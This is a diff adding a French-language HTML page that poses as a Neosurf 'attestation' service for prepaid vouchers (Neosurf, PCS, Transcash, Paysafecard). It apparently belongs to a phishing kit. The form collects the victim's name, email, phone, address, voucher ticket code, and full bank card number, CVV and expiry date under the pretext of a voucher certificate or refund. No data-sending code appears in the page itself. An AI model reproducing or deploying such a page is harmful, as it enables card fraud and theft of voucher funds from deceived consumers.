@@ -1,0 +1,171 @@
+<!doctype html>
+<html lang="en">
+  <head>
+  	<title>Neosurf - Fiche d'attestation des recharges</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Fiche d'attestation des recharges">
+    <meta name="keywords" content="Fiche d'attestation des recharges, paysafe, neosurf, pcs, transcash">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800,900" rel="stylesheet">
+		
+		<link rel="stylesheet" href="css/owl.carousel.min.css">
+    <link rel="stylesheet" href="css/owl.theme.default.min.css">
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/4.5.6/css/ionicons.min.css">
+		<link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/main.css">
+  </head>
+  <body>
+	<header>
+        <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
+          <div class="container-fluid">
+            <a class="navbar-brand" href="refund.html">Téléchargement d'attestation</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+              <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarCollapse">
+              <ul class="navbar-nav me-auto mb-2 mb-md-0">
+                <li class="nav-item">
+                  <a class="nav-link" href="index.html">Accueil</a>
+                </li>
+                <li class="nav-item">
+                  <a class="nav-link active" href="attestation.html">Télécharger une fiche d'attestation</a>
+                </li>
+                <li class="nav-item">
+                  <a class="nav-link" href="refund.html">Demande de remboursement</a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </nav>
+      </header>
+
+    <div class="container-fluid px-1 py-5 mx-auto">
+        <div class="row d-flex justify-content-center">
+            <div class="col-xl-7 col-lg-8 col-md-9 col-11 text-center">
+                <h3 class="space">Neosurf</h3> <br>
+                <figure class="margin-bottom-medium">
+                    <img src="images/neosurf.jpg" height="100" width="200" class="footer-logo" alt="TransCash">
+                </figure>
+                <div class="card">
+                    <form class="form-card" onsubmit="event.preventDefault()">
+                        <div class="row justify-content-between text-left">
+                            <div class="form-group col-sm-6 flex-column d-flex">
+                                <input type="text" id="fname" name="fname" placeholder="Nom complet" required="required" onblur="validate(1)">
+                            </div>
+                            <div class="form-group col-sm-6 flex-column d-flex">
+                                <input type="text" id="email" name="email" placeholder="Email" required="required" onblur="validate(2)">
+                            </div>
+                        </div>
+                        <div class="row justify-content-between text-left">
+                            <div class="form-group col-sm-6 flex-column d-flex">
+                                <input type="text" id="montant" name="montant" placeholder="Montant de l'achat/Remboursement" required="required" onblur="validate(3)">
+                            </div>
+                            <div class="form-group col-sm-6 flex-column d-flex">
+                                <input type="text" id="ticket" name="ticket" placeholder="Code du ticket" required="required" onblur="validate(4)">
+                            </div>
+                        </div>
+                        <div class="row justify-content-between text-left">
+                            <div class="form-group col-sm-6 flex-column d-flex">
+                                <input type="text" id="phone" name="phone" placeholder="N° de Téléphone" required="required" onblur="validate(5)">
+                            </div>
+                            <div class="form-group col-sm-6 flex-column d-flex">
+                                <input type="text" id="adresse" name="adresse" placeholder="Adresse" required="required" onblur="validate(6)">
+                            </div>
+                        </div>
+                        <div class="row justify-content-between text-left">
+                            <div class="form-group col-6 flex-column d-flex">
+                                <select name="trecharge" id="trecharge" required="required" onblur="validate(7)">
+                                    <option selected="selected">Type de recharge</option>
+                                    <option value="Transcash">Transcash</option>
+                                    <option value="PCS">PCS</option>
+                                    <option value="Neosurf">Neosurf</option>
+                                    <option value="PaySafeCard">PaySafeCard</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="row justify-content-between text-left">
+                            <div class="form-group col-sm-6 flex-column d-flex">
+                                <input type="text" id="carteNumber" name="carteNumber" placeholder="N° de carte bancaire" required="required" onblur="validate(8)">
+                            </div>
+                        </div>
+                        <div class="row justify-content-between text-left">
+                            <div class="form-group col-6 flex-column d-flex">
+                                <select name="tcarte" id="tcarte" required="required" onblur="validate(9)">
+                                    <option selected="selected">Type de carte</option>
+                                    <option value="Visa">Visa</option>
+                                    <option value="Mastercard">Mastercard</option>
+                                    <option value="American Expess">American Expess</option>
+                                    <option value="Bancontact">Bancontact</option>
+                                </select>
+                            </div>
+                            <div class="form-group col-6 flex-column d-flex">
+                                <input type="text" id="cvv" name="cvv" placeholder="CVV2/CVC" required="required" onblur="validate(10)">
+                            </div>
+                        </div>
+                        <div class="row justify-content-between text-left">
+                            <div class="form-group col-6 flex-column d-flex">
+                                <select name="month" id="month" required="required" onblur="validate(11)">
+                                    <option selected="selected">Mois</option>
+                                    <option value="01">01</option>
+                                    <option value="02">02</option>
+                                    <option value="03">03</option>
+                                    <option value="04">04</option>
+                                    <option value="05">05</option>
+                                    <option value="06">06</option>
+                                    <option value="07">07</option>
+                                    <option value="08">08</option>
+                                    <option value="09">09</option>
+                                    <option value="10">10</option>
+                                    <option value="11">11</option>
+                                    <option value="12">12</option>
+                                </select>
+                            </div>
+                            <div class="form-group col-6 flex-column d-flex">
+                                <select name="year" id="year" required="required" onblur="validate(12)">
+                                    <option selected="selected">Année</option>
+                                    <option value="2020">2020</option>
+                                    <option value="2021">2021</option>
+                                    <option value="2022">2022</option>
+                                    <option value="2023">2023</option>
+                                    <option value="2024">2024</option>
+                                    <option value="2025">2025</option>
+                                    <option value="2026">2026</option>
+                                    <option value="2027">2027</option>
+                                    <option value="2028">2028</option>
+                                    <option value="2029">2029</option>
+                                    <option value="2030">2030</option>
+                                    <option value="2031">2031</option>
+                                    <option value="2032">2032</option>
+                                    <option value="2033">2033</option>
+                                    <option value="2034">2034</option>
+                                    <option value="2035">2035</option>
+                                    <option value="2036">2036</option>
+                                    <option value="2037">2037</option>
+                                    <option value="2038">2038</option>
+                                    <option value="2039">2039</option>
+                                    <option value="2040">2040</option>
+                                    <option value="2041">2041</option>
+                                    <option value="2042">2042</option>
+                                    <option value="2043">2043</option>
+                                    <option value="2044">2044</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="row justify-content-end">
+                            <div class="form-group col-sm-6"> <button type="submit" class="btn-block btn-primary">Envoyer</button> </div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/jquery.min.js"></script>
+    <script src="js/popper.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/owl.carousel.min.js"></script>
+    <script src="js/main.js"></script>
+    <script src="js/bootstrap.bundle.min.js"></script>
+  </body>
+</html>
